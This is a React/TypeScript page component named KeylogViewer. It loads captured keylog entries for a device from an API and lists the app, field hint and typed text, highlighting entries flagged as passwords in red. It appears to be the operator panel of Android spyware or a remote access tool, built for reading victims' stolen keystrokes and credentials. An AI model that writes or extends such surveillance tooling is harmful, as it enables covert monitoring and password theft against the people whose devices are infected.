import React, { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import { keylogs } from '../api/client'
import type { KeylogEntry } from '../api/types'

export default function KeylogViewer() {
  const { id } = useParams<{ id: string }>()
  const [entries, setEntries] = useState<KeylogEntry[]>([])
  const [filter, setFilter] = useState('')

  useEffect(() => {
    if (id) keylogs.list(id).then(r => setEntries(r.data.entries ?? []))
  }, [id])

  const filtered = entries.filter(e =>
    e.app_package.includes(filter) ||
    e.content.toLowerCase().includes(filter.toLowerCase())
  )

  return (
    <div className="min-h-screen bg-surface p-6">
      <h1 className="text-2xl font-bold text-white mb-4">Keylogs</h1>
      <input className="bg-panel border border-border text-white px-3 py-2 rounded w-full mb-4"
        placeholder="Filter by app or content…" value={filter} onChange={e => setFilter(e.target.value)} />
      <div className="space-y-1">
        {filtered.map(e => (
          <div key={e.id} className={`bg-panel border rounded p-2 text-sm flex gap-3 items-center
            ${e.is_password ? 'border-danger' : 'border-border'}`}>
            <span className="text-accent shrink-0">{e.app_package.split('.').pop()}</span>
            {e.field_hint && <span className="text-gray-500 shrink-0">[{e.field_hint}]</span>}
            <span className={`flex-1 ${e.is_password ? 'text-danger font-mono' : 'text-white'}`}>
              {e.content}
            </span>
            <span className="text-gray-500 shrink-0">{new Date(e.timestamp).toLocaleTimeString()}</span>
          </div>
        ))}
      </div>
    </div>
  )
}
